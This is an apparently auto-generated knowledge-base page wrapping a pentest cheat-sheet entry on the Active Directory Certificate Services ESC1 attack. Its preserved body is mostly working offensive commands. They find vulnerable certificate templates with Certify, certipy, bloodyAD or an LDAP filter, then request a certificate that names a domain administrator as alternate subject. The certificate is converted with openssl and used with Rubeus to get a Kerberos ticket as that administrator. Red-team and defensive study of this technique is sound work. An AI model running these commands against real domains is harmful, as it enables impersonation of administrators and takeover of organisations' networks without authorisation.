---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Certificate ESC1

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adcs-esc01` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc01.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Certificate ESC1](../../topics/active-directory/active-directory-certificate-esc1.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adcs-esc01 |
| name | Active Directory - Certificate ESC1 |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adcs-esc01.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Certificate ESC1\n\n## ESC1 - Misconfigured Certificate Templates\n\n> Domain Users can enroll\
  \ in the **VulnTemplate** template, which can be used for client authentication and has **ENROLLEE_SUPPLIES_SUBJECT** set.\
  \ This allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name (i.e. as a DA). Allows\
  \ additional identities to be bound to a certificate beyond the Subject.\n\n**Requirements**\n\n* Template that allows for\
  \ AD authentication\n* **ENROLLEE_SUPPLIES_SUBJECT** flag\n* [PKINIT] Client Authentication, Smart Card Logon, Any Purpose,\
  \ or No EKU (Extended/Enhanced Key Usage)\n\n**Exploitation**\n\n* Use [Certify.exe](https://github.com/GhostPack/Certify)\
  \ to see if there are any vulnerable templates\n\n    ```ps1\n    Certify.exe find /vulnerable\n    Certify.exe find /vulnerable\
  \ /currentuser\n    # or\n    PS> Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)\
  \ (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'\n\
  \    # or\n    certipy 'domain.local'/'user':'password'@'domaincontroller' find -bloodhound\n    # or\n    python bloodyAD.py\
  \ -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=lab,DC=local'\
  \ --filter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)\
  \ (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))'\n    ```\n\n* Use Certify,\
  \ [Certi](https://github.com/eloypgz/certi) or [Certipy](https://github.com/ly4k/Certipy) to request a Certificate and add\
  \ an alternative name (user to impersonate)\n\n    ```ps1\n    # request certificates for the machine account by executing\
  \ Certify with the \"/machine\" argument from an elevated command prompt.\n    Certify.exe request /ca:dc.domain.local\\\
  domain-DC-CA /template:VulnTemplate /altname:domadmin\n    certi.py req 'contoso.local/Anakin@dc01.contoso.local' contoso-DC01-CA\
  \ -k -n --alt-name han --template UserSAN\n    certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template\
  \ 'ESC1' -alt 'administrator@corp.local'\n    ```\n\n* Use OpenSSL and convert the certificate, do not enter a password\n\
  \n    ```ps1\n    openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" -export -out\
  \ cert.pfx\n    ```\n\n* Move the cert.pfx to the target machine filesystem and request a TGT for the altname user using\
  \ Rubeus\n\n    ```ps1\n    Rubeus.exe asktgt /user:domadmin /certificate:C:\\Temp\\cert.pfx\n    ```\n\n**WARNING**: These\
  \ certificates will still be usable even if the user or computer resets their password!\n\n**NOTE**: Look for **EDITF_ATTRIBUTESUBJECTALTNAME2**,\
  \ **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT**, **ManageCA** flags, and NTLM Relay to AD CS HTTP Endpoints.\n\n## References"
_relative_path: active-directory/ad-adcs-esc01.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc01.md
````
